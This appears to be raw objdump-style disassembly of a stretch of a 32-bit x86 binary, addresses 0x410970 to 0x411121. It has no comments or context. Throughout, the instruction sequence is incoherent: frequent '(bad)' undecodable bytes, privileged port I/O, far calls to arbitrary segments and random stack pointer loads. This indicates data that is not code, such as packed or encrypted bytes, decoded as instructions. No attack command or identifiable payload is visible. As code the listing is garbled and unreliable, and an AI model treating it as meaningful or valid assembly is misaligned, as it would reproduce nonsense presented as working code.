  410970:	dec    esi
  410971:	push   edx
  410972:	les    eax,FWORD PTR [ebp-0x26]
  410975:	push   ecx
  410976:	fmul   QWORD PTR [ebx+0x26]
  410979:	adc    DWORD PTR ds:0xc173bfe9,edi
  41097f:	push   ds
  410980:	pop    ss
  410981:	(bad)  
  410982:	int3   
  410983:	pop    ss
  410984:	not    esp
  410986:	aam    0xe3
  410988:	pop    esp
  410989:	mov    ah,0x9d
  41098b:	out    dx,al
  41098c:	dec    edi
  41098d:	sbb    BYTE PTR [esp+eax*1],al
  410990:	add    ebp,esp
  410992:	cdq    
  410993:	sbb    ebx,DWORD PTR [ebp-0x5816fd0b]
  410999:	mov    ecx,0x9022acb9
  41099e:	test   eax,0x70327935
  4109a3:	sub    BYTE PTR [ebx-0x69e7f79e],ch
  4109a9:	ins    BYTE PTR es:[edi],dx
  4109aa:	xchg   esp,eax
  4109ab:	fwait
  4109ac:	aaa    
  4109ad:	pop    edx
  4109ae:	std    
  4109af:	cli    
  4109b0:	sub    dh,BYTE PTR [edi-0x74]
  4109b3:	inc    esi
  4109b4:	aas    
  4109b5:	arpl   WORD PTR [ecx+0x66],dx
  4109b8:	cli    
  4109b9:	xchg   esi,ecx
  4109bb:	pushf  
  4109bc:	ds test dh,0x3
  4109c0:	sar    ch,1
  4109c2:	sub    bl,cl
  4109c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109c5:	jns    0x41098b
  4109c7:	out    0x4c,al
  4109c9:	sbb    ecx,DWORD PTR [edi-0x1032844c]
  4109cf:	jle    0x410a10
  4109d1:	popf   
  4109d2:	pop    esp
  4109d3:	daa    
  4109d4:	or     DWORD PTR [ecx],ecx
  4109d6:	ins    BYTE PTR es:[edi],dx
  4109d7:	aad    0xe0
  4109d9:	mov    dl,0xd1
  4109db:	cmp    ah,BYTE PTR [edi+0x3394f271]
  4109e1:	imul   eax,edx,0x17
  4109e4:	call   0x7fa:0xd44a861
  4109eb:	(bad)  
  4109ed:	imul   ebp,DWORD PTR ds:0xd5fa014f,0xfd208361
  4109f7:	cli    
  4109f8:	pop    edi
  4109f9:	inc    esi
  4109fa:	mov    eax,0xe6e0f97e
  4109ff:	retf   0xa7d6
  410a02:	repnz push ss
  410a04:	xchg   edi,eax
  410a05:	pop    ebp
  410a06:	out    0x28,eax
  410a08:	or     bh,dh
  410a0a:	sub    eax,0x8117f814
  410a0f:	data16 into 
  410a11:	lock adc eax,0x5ad57b0e
  410a17:	imul   esp,ebx,0xffffffc9
  410a1a:	jge    0x4109b2
  410a1c:	cmp    eax,0x17539a18
  410a21:	(bad)  
  410a22:	sub    DWORD PTR [edx],edx
  410a24:	mov    BYTE PTR [edx+0x2e],bh
  410a27:	push   edi
  410a28:	lock leave 
  410a2a:	call   0xbfe44ab9
  410a2f:	(bad)  
  410a30:	mov    edi,0xf1ee3a48
  410a35:	stc    
  410a36:	xchg   BYTE PTR [esi-0xcc14260],cl
  410a3c:	lahf   
  410a3d:	shl    DWORD PTR [ecx],1
  410a3f:	add    eax,0xa8a4d010
  410a44:	mov    bl,0x56
  410a46:	cmovg  ebp,ebp
  410a49:	push   esi
  410a4a:	xchg   edi,eax
  410a4b:	scas   eax,DWORD PTR es:[edi]
  410a4c:	sbb    bl,BYTE PTR es:[ecx-0x10]
  410a50:	jns    0x410a40
  410a52:	daa    
  410a53:	ror    BYTE PTR [eax+0x53],0x56
  410a57:	adc    BYTE PTR [ebp+0x12f6d624],0xdd
  410a5e:	sar    dl,cl
  410a60:	stos   BYTE PTR es:[edi],al
  410a61:	push   0xffffff95
  410a63:	call   0x1a34:0x76edb4e5
  410a6a:	push   esi
  410a6b:	fs push 0x824f4a9f
  410a71:	or     al,0x4
  410a73:	add    al,0x57
  410a75:	mov    bh,0x47
  410a77:	ret    0x42cf
  410a7a:	not    edi
  410a7c:	mov    esp,0x512e35b1
  410a81:	popf   
  410a82:	jmp    0x410a63
  410a84:	jbe    0x410a1b
  410a86:	adc    esi,DWORD PTR [eax]
  410a88:	jcxz   0x410a74
  410a8b:	mov    ebp,0x46da8c90
  410a90:	loopne 0x410af9
  410a92:	jno    0x410b03
  410a94:	fild   WORD PTR [edx-0x4c]
  410a97:	dec    esp
  410a98:	push   ebp
  410a99:	mov    dl,0xea
  410a9b:	add    esp,esp
  410a9d:	mov    eax,0xb16b0be8
  410aa2:	aas    
  410aa3:	into   
  410aa4:	push   ds
  410aa5:	icebp  
  410aa6:	sbb    eax,0xfa716610
  410aab:	mov    dh,0x91
  410aad:	pop    eax
  410aae:	pop    ebx
  410aaf:	mov    esi,0xbf4078d5
  410ab4:	add    esi,ebp
  410ab6:	(bad)  
  410ab7:	ror    edx,1
  410ab9:	jns    0x410a95
  410abb:	mov    ebp,0x31260d31
  410ac0:	add    eax,0xf10b3cf0
  410ac5:	test   al,dh
  410ac7:	pop    edi
  410ac8:	xor    ebx,eax
  410aca:	lds    edx,FWORD PTR [edx+0x6db15c15]
  410ad0:	jo     0x410b0c
  410ad2:	fidiv  WORD PTR [edi]
  410ad4:	lock jmp 0x34914917
  410ada:	rcr    BYTE PTR [ebx+0x50],cl
  410add:	xchg   ebp,eax
  410ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410adf:	push   esp
  410ae0:	mov    esp,0xf0808cca
  410ae5:	out    dx,al
  410ae6:	sbb    BYTE PTR [ebp+0x17],bl
  410ae9:	mov    BYTE PTR [ebx],cl
  410aeb:	ret    
  410aec:	add    BYTE PTR [esi],0x2b
  410aef:	push   cs
  410af0:	push   ds
  410af1:	jb     0x410af7
  410af3:	scas   al,BYTE PTR es:[edi]
  410af4:	fwait
  410af5:	dec    ecx
  410af6:	mov    bh,0xf4
  410af8:	(bad)  
  410af9:	mov    bh,0x21
  410afb:	test   DWORD PTR [eax],eax
  410afd:	rcl    BYTE PTR [ecx],1
  410aff:	jmp    0x410aa9
  410b01:	mov    ah,0x43
  410b03:	mov    DWORD PTR ds:0xa92ae4b,esi
  410b09:	inc    esp
  410b0a:	add    eax,DWORD PTR [eax+ecx*4]
  410b0d:	add    eax,0xa3d63afd
  410b12:	push   es
  410b13:	lods   al,BYTE PTR ds:[esi]
  410b14:	jno    0x410ad0
  410b16:	nop
  410b17:	mov    bh,0xa5
  410b19:	cmp    bh,cl
  410b1b:	mov    DWORD PTR [edx+0xa],ecx
  410b1e:	icebp  
  410b1f:	lds    ebp,FWORD PTR [edx]
  410b21:	mov    ah,0x46
  410b23:	loope  0x410ac6
  410b25:	mov    ds:0xaf4f3cd2,al
  410b2a:	push   edx
  410b2b:	stos   BYTE PTR es:[edi],al
  410b2c:	nop
  410b2d:	test   BYTE PTR [ecx],cl
  410b2f:	add    DWORD PTR [ebx-0x2e6dfb51],0xffffffa4
  410b36:	jg     0x410b09
  410b38:	dec    ecx
  410b39:	adc    eax,0xc152d63f
  410b3e:	enter  0x491c,0xd3
  410b42:	xchg   ebp,eax
  410b43:	xor    edi,esi
  410b45:	in     eax,0x4
  410b47:	loope  0x410b33
  410b49:	cmp    eax,0xbb8e481b
  410b4e:	pop    ss
  410b4f:	adc    BYTE PTR [ebx+0x674c645],dh
  410b55:	je     0x410b8c
  410b57:	cdq    
  410b58:	out    0x98,eax
  410b5a:	push   cs
  410b5b:	sar    BYTE PTR [eax],0x69
  410b5e:	fist   WORD PTR [ebp-0x20]
  410b61:	iret   
  410b62:	pop    ebx
  410b63:	mov    ds:0x2cd1c7e7,eax
  410b68:	mov    esi,0xe20ef749
  410b6d:	scas   eax,DWORD PTR es:[edi]
  410b6e:	inc    ebx
  410b6f:	jmp    0xdf1d:0xc0ded8f5
  410b76:	mov    cl,0x40
  410b78:	ror    DWORD PTR [ebp+0x77],0x33
  410b7c:	div    BYTE PTR [edi+0x46]
  410b7f:	out    0x24,eax
  410b81:	xchg   edi,eax
  410b82:	pop    ebx
  410b83:	push   esi
  410b84:	push   ebx
  410b85:	(bad)  
  410b86:	stc    
  410b87:	xor    ecx,ebx
  410b89:	sub    ah,ah
  410b8b:	jg     0x410b5e
  410b8d:	cmp    al,0xe9
  410b8f:	cmp    edx,esp
  410b91:	out    0x65,eax
  410b93:	ss jecxz 0x410b67
  410b96:	xor    DWORD PTR [ecx+0x4aba73d9],esi
  410b9c:	repnz in al,0x1b
  410b9f:	gs ret 
  410ba1:	pop    esi
  410ba2:	cwde   
  410ba3:	inc    esp
  410ba4:	jno    0x410bc4
  410ba6:	fmul   QWORD PTR [edx+ebx*2+0x6d]
  410baa:	daa    
  410bab:	add    ecx,0x35
  410bae:	rol    BYTE PTR [edx-0x6163de8c],0x7e
  410bb5:	and    eax,0xec3cdec4
  410bba:	scas   eax,DWORD PTR es:[edi]
  410bbb:	xlat   BYTE PTR ds:[ebx]
  410bbc:	fadd   DWORD PTR [esi+0x22]
  410bbf:	cmc    
  410bc0:	and    al,0xb8
  410bc2:	rol    edx,cl
  410bc4:	shld   DWORD PTR ds:0xd3248894,edi,0x33
  410bcc:	pop    es
  410bcd:	fsubr  DWORD PTR [edi-0x4c]
  410bd0:	mov    eax,esp
  410bd2:	push   edx
  410bd3:	add    ebp,DWORD PTR [ebx]
  410bd5:	scas   eax,DWORD PTR es:[edi]
  410bd6:	push   ds
  410bd7:	xor    esp,edx
  410bd9:	dec    bp
  410bdb:	scas   al,BYTE PTR es:[edi]
  410bdc:	and    bh,bh
  410bde:	loop   0x410bd1
  410be0:	cmp    esi,DWORD PTR [esi-0xb]
  410be3:	ror    DWORD PTR [ebp-0x34bf668b],1
  410be9:	push   edx
  410bea:	xor    edx,ecx
  410bec:	inc    edi
  410bed:	xchg   edi,eax
  410bee:	xchg   esp,eax
  410bef:	push   edi
  410bf0:	pop    esp
  410bf1:	ds ins DWORD PTR es:[edi],dx
  410bf3:	sbb    BYTE PTR [edx+eiz*8-0x3d],cl
  410bf7:	sub    ch,BYTE PTR [ecx-0x30]
  410bfa:	enter  0xfb7b,0x37
  410bfe:	mov    WORD PTR [ecx+0x234aa230],es
  410c04:	xlat   BYTE PTR ds:[ebx]
  410c05:	frstor [esi-0x3dac4daf]
  410c0b:	add    dl,BYTE PTR [eax+0x43]
  410c0e:	add    cl,BYTE PTR ds:0x962ab5a6
  410c14:	shl    DWORD PTR ds:0x10dc50cb,0x9a
  410c1b:	sbb    edx,DWORD PTR [edx+0x213da3de]
  410c21:	push   0xffffff9d
  410c23:	fdiv   DWORD PTR [eax]
  410c25:	sub    dl,0x38
  410c28:	and    edi,DWORD PTR [ecx]
  410c2a:	sub    DWORD PTR [esi],ecx
  410c2c:	icebp  
  410c2d:	mov    dh,0x4c
  410c2f:	lds    esi,FWORD PTR [eax-0x6a4428bb]
  410c35:	adc    BYTE PTR ds:0xb28df61f,dh
  410c3b:	sbb    DWORD PTR [ecx-0x399975bc],esi
  410c41:	push   DWORD PTR [esi+ebp*8-0x44cc8990]
  410c48:	cmp    bl,BYTE PTR [esp+esi*8+0x44]
  410c4c:	sub    ecx,DWORD PTR ds:0x82166fd3
  410c52:	inc    ebx
  410c53:	xchg   BYTE PTR [ebx-0x51],bh
  410c56:	aaa    
  410c57:	fdivr  st,st(4)
  410c59:	lahf   
  410c5a:	push   0x2cf4e3d8
  410c5f:	icebp  
  410c60:	fidiv  DWORD PTR ds:0x6f955044
  410c66:	push   edx
  410c67:	jne    0x410cb5
  410c69:	mov    al,ds:0x5a6f0ab6
  410c6e:	cmp    BYTE PTR [esi-0x12],0x32
  410c72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c73:	(bad)  
  410c74:	arpl   WORD PTR [ecx+0x3db2c1ca],sp
  410c7a:	sar    BYTE PTR [ebx+0x1dc7c337],0x8f
  410c81:	test   eax,0xe3286777
  410c86:	shl    esi,cl
  410c88:	mov    ds:0x828541fb,eax
  410c8d:	pop    ss
  410c8e:	mov    bh,0xc4
  410c90:	fcom   DWORD PTR [eax+0x7ab4b316]
  410c96:	les    esp,FWORD PTR [ebx-0x70adb29a]
  410c9c:	sub    al,0xf5
  410c9e:	add    ecx,DWORD PTR [esi-0x5c]
  410ca1:	int3   
  410ca2:	sbb    BYTE PTR [ecx+0x68],dh
  410ca5:	(bad)  
  410ca6:	fcom   QWORD PTR [eax]
  410ca8:	sub    BYTE PTR [ebp+0x1d],dh
  410cab:	pop    edx
  410cac:	cdq    
  410cad:	mov    eax,ds:0x35f8adec
  410cb2:	out    dx,eax
  410cb3:	adc    bh,BYTE PTR [ebx+0x7bd64c9a]
  410cb9:	fsubr  DWORD PTR ss:[eax]
  410cbc:	mov    al,0xbf
  410cbe:	in     eax,0x44
  410cc0:	xchg   ebp,eax
  410cc1:	push   esp
  410cc2:	adc    al,0xa8
  410cc4:	xchg   ecx,eax
  410cc5:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  410cc7:	push   cs
  410cc8:	jne    0x410d00
  410cca:	xchg   bh,dl
  410ccc:	test   BYTE PTR [edx-0x2d8a092b],0xa4
  410cd3:	xor    eax,0x853641e9
  410cd8:	mov    al,ds:0x902e6a48
  410cdd:	jle    0x410cc4
  410cdf:	imul   DWORD PTR [edi-0x796dd647]
  410ce5:	pop    ecx
  410ce6:	lea    esp,[esi]
  410ce8:	(bad)  
  410cea:	pop    edi
  410ceb:	mov    esi,eax
  410ced:	int    0xdb
  410cef:	sbb    BYTE PTR [eax],ah
  410cf1:	jns    0x410d15
  410cf3:	fstp   QWORD PTR [ebp-0x3f]
  410cf6:	inc    edi
  410cf7:	mov    esp,0xc82faa1c
  410cfc:	retfw  0xaad9
  410d00:	test   DWORD PTR [ebp-0x6],ecx
  410d03:	adc    ch,0xbf
  410d06:	in     al,dx
  410d07:	fmul   DWORD PTR [ebx+0x23eb3648]
  410d0d:	and    al,0xbd
  410d0f:	sub    al,0x4d
  410d11:	ds push ebx
  410d13:	lahf   
  410d14:	cwde   
  410d15:	ins    DWORD PTR es:[edi],dx
  410d16:	xchg   esi,eax
  410d17:	test   BYTE PTR [edi-0x6bd93b37],bl
  410d1d:	xchg   DWORD PTR [esi-0x1c],edi
  410d20:	(bad)  
  410d21:	sbb    BYTE PTR [ebx-0x2d071635],ah
  410d27:	jp     0x410d83
  410d29:	dec    DWORD PTR [ebx-0x4]
  410d2c:	es mov edi,0x220a27fa
  410d32:	sub    dh,BYTE PTR [edx+0x7a]
  410d35:	or     ch,BYTE PTR [edx-0x51422f4d]
  410d3b:	pop    ss
  410d3c:	in     eax,dx
  410d3d:	dec    esp
  410d3e:	lds    ebp,FWORD PTR [ecx]
  410d40:	cmp    esi,DWORD PTR [ebx]
  410d42:	inc    edi
  410d43:	ds jbe 0x410cd9
  410d46:	lahf   
  410d47:	popa   
  410d48:	neg    BYTE PTR [esi+0x79b3f523]
  410d4e:	mov    bl,0xef
  410d50:	dec    ebx
  410d51:	xor    eax,0xfe8c10c8
  410d56:	add    eax,0x9188f009
  410d5b:	jl     0x410da9
  410d5d:	into   
  410d5e:	(bad)  
  410d5f:	sbb    eax,0x487bb1a8
  410d64:	sub    al,0xf1
  410d66:	adc    edx,ebx
  410d68:	jmp    0x704d:0x1ed3dc23
  410d6f:	push   ecx
  410d70:	js     0x410de1
  410d72:	pop    edi
  410d73:	mov    edx,0xe6fd8019
  410d78:	addr16 icebp 
  410d7a:	jg     0x410dee
  410d7c:	test   eax,0x7bf91a78
  410d81:	jb     0x410d56
  410d83:	or     ch,ch
  410d85:	outs   dx,BYTE PTR ds:[esi]
  410d86:	and    al,0x2d
  410d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d89:	in     al,0x2a
  410d8b:	cwde   
  410d8c:	je     0x410d2d
  410d8e:	adc    dh,0x8d
  410d91:	and    al,0x10
  410d93:	fcmovb st,st(1)
  410d95:	cli    
  410d96:	or     ebx,0x630c0ad9
  410d9c:	and    eax,DWORD PTR [ecx+edx*8]
  410d9f:	xchg   DWORD PTR [edx],esi
  410da1:	add    dh,dh
  410da3:	test   DWORD PTR [ecx],eax
  410da5:	and    DWORD PTR [esi-0x39],esp
  410da8:	mov    DWORD PTR [edx-0x22716db8],ebp
  410dae:	test   al,cl
  410db0:	rcr    BYTE PTR [ecx],1
  410db2:	imul   eax,DWORD PTR [edx+0x6056148b],0x22
  410db9:	das    
  410dba:	pop    edi
  410dbb:	mov    ebx,0xe7d1880
  410dc0:	dec    esi
  410dc1:	mov    al,0x13
  410dc3:	or     ebp,DWORD PTR [ebp-0x2c627763]
  410dc9:	in     al,0xa8
  410dcb:	(bad)  [eax+0x3c]
  410dce:	mov    edi,DWORD PTR [di]
  410dd1:	aaa    
  410dd2:	jo     0x410da4
  410dd4:	sbb    BYTE PTR [ebx],dh
  410dd6:	xchg   edx,eax
  410dd7:	out    0xbc,al
  410dd9:	lea    ebp,[eax]
  410ddb:	js     0x410e17
  410ddd:	push   edi
  410dde:	out    0xe1,al
  410de0:	dec    esi
  410de1:	push   esp
  410de2:	cmp    BYTE PTR [ebp+0x6e50e1f2],ah
  410de8:	out    0xe1,eax
  410dea:	and    BYTE PTR [edi],ah
  410dec:	jb     0x410dea
  410dee:	xchg   BYTE PTR [esi-0x53],cl
  410df1:	xchg   ebx,eax
  410df2:	popf   
  410df3:	adc    esp,0x98fa840f
  410df9:	dec    esp
  410dfa:	xlat   BYTE PTR ds:[ebx]
  410dfb:	loop   0x410e57
  410dfd:	xlat   BYTE PTR ds:[ebx]
  410dfe:	(bad)  
  410dff:	enter  0xa5ec,0xcd
  410e03:	mov    es,WORD PTR [ebx]
  410e05:	sbb    bl,BYTE PTR [edx-0x60ce7bcf]
  410e0b:	jo     0x410d9d
  410e0d:	ds pop esp
  410e0f:	xchg   BYTE PTR [esi-0x66],dl
  410e12:	inc    DWORD PTR [ebp+edx*2+0x11]
  410e16:	push   cs
  410e17:	and    eax,0x325392a
  410e1c:	rcr    BYTE PTR [eax],0xa7
  410e1f:	push   es
  410e20:	(bad)  
  410e21:	popf   
  410e22:	ficomp WORD PTR [ecx+0x39ddfbcd]
  410e28:	mov    ecx,0x5d877d38
  410e2d:	inc    esi
  410e2e:	aaa    
  410e2f:	and    esi,DWORD PTR [ebx+edx*8-0x3c6c0878]
  410e36:	fld    DWORD PTR [ebx+0x5c0545dd]
  410e3c:	pop    esp
  410e3d:	lock cmp dl,dl
  410e40:	scas   eax,DWORD PTR es:[edi]
  410e41:	adc    esp,DWORD PTR [edx+ecx*4+0xf964feb]
  410e48:	sub    bh,bh
  410e4a:	push   esp
  410e4b:	repz loopne 0x410df5
  410e4e:	mov    edx,esp
  410e50:	xchg   ebp,eax
  410e51:	and    DWORD PTR [edx-0x2926e37],ebx
  410e57:	pop    esp
  410e58:	mov    edx,0x7d9c149f
  410e5d:	xchg   BYTE PTR [ebp+esi*2-0x6e6fe909],bh
  410e64:	sbb    eax,0x3df7287f
  410e69:	fsub   QWORD PTR [ecx-0x4d]
  410e6c:	neg    BYTE PTR [edi+edx*4-0x70]
  410e70:	fcomp  QWORD PTR [ecx]
  410e72:	adc    DWORD PTR [eax+0x34708150],0x61
  410e79:	sbb    al,0xa8
  410e7b:	jl     0x410e0c
  410e7d:	fsubp  st(7),st
  410e7f:	xlat   BYTE PTR ds:[ebx]
  410e80:	outs   dx,DWORD PTR ds:[esi]
  410e81:	or     bh,BYTE PTR [edi-0x29a4a955]
  410e87:	(bad)  
  410e89:	out    0x6a,al
  410e8b:	test   al,0x42
  410e8d:	ss and ebx,DWORD PTR ss:[edi+0xa693b41]
  410e95:	test   BYTE PTR [ebx+ebx*4],ah
  410e98:	mov    edi,0xc7506ad2
  410e9d:	and    eax,0xb9ed7d38
  410ea2:	dec    edi
  410ea3:	sbb    esp,esp
  410ea5:	push   edx
  410ea6:	stc    
  410ea7:	stc    
  410ea8:	or     DWORD PTR [edx],0x3f
  410eab:	pop    ecx
  410eac:	pop    eax
  410ead:	or     edi,DWORD PTR [ecx]
  410eaf:	aam    0x53
  410eb1:	(bad)  
  410eb2:	scas   eax,DWORD PTR es:[edi]
  410eb3:	pop    es
  410eb4:	in     eax,dx
  410eb5:	es ins DWORD PTR es:[edi],dx
  410eb7:	xchg   DWORD PTR [ebx-0x3d9e7c95],edi
  410ebd:	mov    DWORD PTR [ebp+0x6c769584],ebp
  410ec3:	(bad)  
  410ec4:	in     al,0xf4
  410ec6:	into   
  410ec7:	scas   eax,DWORD PTR es:[edi]
  410ec8:	es push edi
  410eca:	xor    DWORD PTR [ebx+0xe],0x45
  410ece:	mov    ebp,0x4a3aa5a5
  410ed3:	xor    DWORD PTR [ecx+0x1a],ebx
  410ed6:	dec    edi
  410ed7:	or     al,0xc9
  410ed9:	mov    cl,0xfa
  410edb:	and    al,0xaf
  410edd:	int3   
  410ede:	loop   0x410ea0
  410ee0:	lods   eax,DWORD PTR ds:[esi]
  410ee1:	pushf  
  410ee2:	xchg   ecx,eax
  410ee3:	cmc    
  410ee4:	jecxz  0x410f40
  410ee6:	stos   DWORD PTR es:[edi],eax
  410ee7:	pop    ebp
  410ee8:	cmp    dh,BYTE PTR [ecx+0x3e]
  410eeb:	(bad)  [edx-0x30]
  410eee:	add    ebp,DWORD PTR [edi-0x7a]
  410ef1:	imul   ecx,DWORD PTR [ebx],0xcec16232
  410ef7:	inc    esp
  410ef8:	xchg   DWORD PTR [esi-0x2e],ebx
  410efb:	sahf   
  410efc:	(bad)  
  410efd:	popf   
  410efe:	add    eax,0x842c29c3
  410f03:	arpl   WORD PTR [edx-0x26],sp
  410f06:	mov    bl,0x98
  410f08:	in     al,dx
  410f09:	mov    BYTE PTR [edx+0x65],ch
  410f0c:	push   ds
  410f0d:	push   cs
  410f0e:	mov    ch,0x89
  410f10:	(bad)  
  410f11:	cwde   
  410f12:	jmp    0x410f6b
  410f14:	mov    cl,0x75
  410f16:	inc    edx
  410f17:	mov    cl,0x2b
  410f19:	clc    
  410f1a:	daa    
  410f1b:	sbb    DWORD PTR [edx-0x52],ebx
  410f1e:	repnz pop ebp
  410f20:	std    
  410f21:	icebp  
  410f22:	shr    BYTE PTR [esi+0x8],0xe3
  410f26:	xor    bh,BYTE PTR [eax]
  410f28:	jnp    0x410f17
  410f2a:	sbb    al,0xf6
  410f2c:	dec    esi
  410f2d:	mov    esp,0x1fdaa438
  410f32:	push   es
  410f33:	(bad)  
  410f34:	pop    eax
  410f35:	dec    ebp
  410f36:	inc    esp
  410f37:	ror    DWORD PTR [edi+0x6ebfe0d2],cl
  410f3d:	js     0x410f20
  410f3f:	inc    ebp
  410f40:	fisttp WORD PTR [edi+edi*4-0x34]
  410f44:	aaa    
  410f45:	mov    esp,0xc034b2b0
  410f4a:	adc    eax,0x4e358d02
  410f4f:	lea    edx,[eax+edi*2+0x5995ff6e]
  410f56:	mov    ah,0xd3
  410f58:	pop    esp
  410f59:	xor    eax,0xf52f7803
  410f5e:	jne    0x410f48
  410f60:	call   FWORD PTR [eax+0x7107bdd0]
  410f66:	jbe    0x410f14
  410f68:	or     ecx,DWORD PTR ds:0x903a8da8
  410f6e:	xchg   edx,eax
  410f6f:	xchg   DWORD PTR ds:0xab2091ac,edi
  410f75:	cwde   
  410f76:	lds    esp,FWORD PTR [eax+0x2b550c7b]
  410f7c:	stc    
  410f7d:	sub    BYTE PTR [ebp+0x71],ch
  410f80:	retf   
  410f81:	dec    ecx
  410f82:	jle    0x410f13
  410f84:	sub    esp,DWORD PTR [edx+ebx*2-0xbdc9ecd]
  410f8b:	pushf  
  410f8c:	add    eax,0x9eaea4b9
  410f91:	xchg   ecx,eax
  410f92:	cmp    eax,0x64611560
  410f97:	and    al,0xb4
  410f99:	mov    ebx,0x90f09e0f
  410f9e:	fistp  QWORD PTR [ebx]
  410fa0:	neg    ch
  410fa2:	ins    DWORD PTR es:[edi],dx
  410fa3:	repz (bad) 
  410fa6:	jecxz  0x410fbd
  410fa8:	addr16 js 0x410f74
  410fab:	jo     0x410ff6
  410fad:	data16 sub al,0x27
  410fb0:	dec    edx
  410fb1:	cmp    DWORD PTR [ebx-0x77],esp
  410fb4:	xchg   ebp,eax
  410fb5:	push   ss
  410fb6:	setg   BYTE PTR [edx+0x22]
  410fba:	outs   dx,DWORD PTR ds:[esi]
  410fbb:	add    DWORD PTR [ebx],eax
  410fbd:	push   eax
  410fbe:	xor    cl,bl
  410fc0:	rcl    BYTE PTR [edx+edi*1+0x415bd036],cl
  410fc7:	pop    ds
  410fc8:	sub    al,0xcd
  410fca:	stc    
  410fcb:	sbb    al,BYTE PTR [ecx]
  410fcd:	adc    al,BYTE PTR ds:0x8da9137e
  410fd3:	imul   eax,edx,0x2c2ee60e
  410fd9:	scas   al,BYTE PTR es:[edi]
  410fda:	retf   0xc481
  410fdd:	xchg   BYTE PTR [edi],cl
  410fdf:	aam    0x3e
  410fe1:	and    al,0x1f
  410fe3:	sub    DWORD PTR [ecx+0x5b],0xffffffe2
  410fe7:	add    eax,0xeb360c15
  410fec:	add    DWORD PTR [ebx+0x5],ebx
  410fef:	call   0x860b:0x5c1558d0
  410ff6:	scas   al,BYTE PTR es:[edi]
  410ff7:	pusha  
  410ff8:	stos   DWORD PTR es:[edi],eax
  410ff9:	test   DWORD PTR [eax+0x7d91150d],edi
  410fff:	fstp   st(1)
  411001:	jp     0x410fb3
  411003:	xor    al,0x6b
  411005:	mov    eax,ds:0xc677ac80
  41100a:	mov    ebp,0xef21ce1d
  41100f:	ins    DWORD PTR es:[edi],dx
  411010:	push   esi
  411011:	jnp    0x411076
  411013:	data16 aaa 
  411015:	lods   eax,DWORD PTR ds:[esi]
  411016:	neg    ebx
  411018:	stos   DWORD PTR es:[edi],eax
  411019:	ss ins DWORD PTR es:[edi],dx
  41101b:	and    bh,BYTE PTR [ebx-0x18731b9c]
  411021:	dec    eax
  411022:	mov    bl,0xfa
  411024:	sar    cl,1
  411026:	stos   DWORD PTR es:[edi],eax
  411027:	dec    DWORD PTR [edx+eax*2-0x2631a5a7]
  41102e:	add    eax,0x14f0ebf9
  411033:	std    
  411034:	mov    edi,0x90b15ebe
  411039:	lods   eax,DWORD PTR ds:[esi]
  41103a:	jbe    0x41101c
  41103c:	and    ebp,esp
  41103e:	fwait
  41103f:	mov    dl,0xf5
  411041:	sbb    DWORD PTR [edx-0xb],edx
  411044:	add    dl,BYTE PTR [ebx]
  411046:	push   cs
  411047:	inc    esp
  411048:	xchg   ebp,eax
  411049:	add    edi,DWORD PTR [edx]
  41104b:	test   DWORD PTR [edi-0x7524aa00],0x481ed3fb
  411055:	xchg   DWORD PTR [edi+0x16521dbd],edx
  41105b:	push   cs
  41105c:	mov    BYTE PTR [ebp+ebx*8-0x64e73863],al
  411063:	jmp    0x7881:0xdaa2b38e
  41106a:	cmp    dl,bl
  41106c:	sub    al,0x0
  41106e:	pop    ebp
  41106f:	lods   eax,DWORD PTR ds:[esi]
  411070:	jecxz  0x411079
  411072:	add    eax,0x3b9e383b
  411077:	shl    esp,cl
  411079:	sbb    BYTE PTR [edx+0x1f],ch
  41107c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41107d:	sahf   
  41107e:	(bad)  
  41107f:	pop    edi
  411080:	leave  
  411081:	lods   al,BYTE PTR ds:[esi]
  411082:	lods   al,BYTE PTR ds:[esi]
  411083:	nop
  411084:	inc    ecx
  411085:	sub    ebp,DWORD PTR gs:[edi]
  411088:	in     al,dx
  411089:	sbb    eax,0x8260b32b
  41108e:	loope  0x4110c6
  411090:	dec    eax
  411091:	pop    es
  411092:	inc    eax
  411093:	push   cs
  411094:	xor    eax,0x57846516
  411099:	das    
  41109a:	outs   dx,BYTE PTR ds:[esi]
  41109b:	push   0xf
  41109d:	dec    eax
  41109e:	push   ss
  41109f:	sub    al,0x5c
  4110a1:	fistp  DWORD PTR [eax+0x1d]
  4110a4:	mov    bh,0x5c
  4110a6:	fwait
  4110a7:	pusha  
  4110a8:	stc    
  4110a9:	mov    ah,dl
  4110ab:	jnp    0x411063
  4110ad:	js     0x41108f
  4110af:	ret    
  4110b0:	push   ebp
  4110b1:	mov    ecx,DWORD PTR [esi]
  4110b3:	(bad)  
  4110b4:	jl     0x4110b9
  4110b6:	xchg   ecx,eax
  4110b7:	adc    esp,eax
  4110b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110ba:	sub    esi,0xe883fc4f
  4110c0:	(bad)  
  4110c1:	push   ebx
  4110c2:	mov    eax,0xf82d4a7
  4110c7:	xchg   esi,eax
  4110c8:	push   edi
  4110c9:	lahf   
  4110ca:	pop    edi
  4110cb:	jbe    0x411070
  4110cd:	sbb    DWORD PTR [ebx+0x2c],esi
  4110d0:	enter  0x5f0,0xe2
  4110d4:	dec    ecx
  4110d5:	dec    edi
  4110d6:	cdq    
  4110d7:	div    BYTE PTR [ebx+0x147a27d6]
  4110dd:	sub    bl,BYTE PTR ds:[eax+0x6a9b869b]
  4110e4:	pop    es
  4110e5:	sub    BYTE PTR [ecx-0x7],ch
  4110e8:	jnp    0x41107a
  4110ea:	dec    ecx
  4110eb:	mov    dl,0x9a
  4110ed:	les    ebx,FWORD PTR [ecx+ebx*8]
  4110f0:	push   ss
  4110f1:	ins    DWORD PTR es:[edi],dx
  4110f2:	cmp    DWORD PTR ds:0x58fee0e7,esp
  4110f8:	mov    esp,0x874bbed4
  4110fd:	and    eax,0x6c167850
  411102:	dec    ecx
  411103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411104:	jg     0x41117b
  411106:	neg    BYTE PTR [ebp+0x66abc48b]
  41110c:	or     ah,0x54
  41110f:	(bad)  
  411110:	xchg   edi,eax
  411111:	(bad)  
  411112:	cmp    al,BYTE PTR [ecx-0x4fc543fe]
  411118:	imul   edi,DWORD PTR [edi],0x83b0ec00
  41111e:	(bad)  
  41111f:	jne    0x4110b6
  411121:	push   esp
